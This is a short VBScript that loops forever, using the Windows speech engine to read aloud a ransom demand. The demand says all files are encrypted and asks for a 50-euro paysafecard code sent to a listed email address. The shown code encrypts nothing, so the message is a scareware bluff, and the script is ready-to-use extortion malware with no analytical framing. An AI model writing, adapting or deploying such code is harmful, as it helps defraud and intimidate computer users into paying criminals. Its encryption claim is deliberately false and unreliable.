do
strText = "All your files, documents, videos, pictures and other files have been encrypted with a special algorithm.  If you want the files back, you have to send the paysafecard code to the email  wormlocker789@gmail.com.  After sending the amount of 50 euros, you will  receive a decrypt code to unlock all files."

Set objVoice = CreateObject("SAPI.SpVoice")
objVoice.Speak strText
loop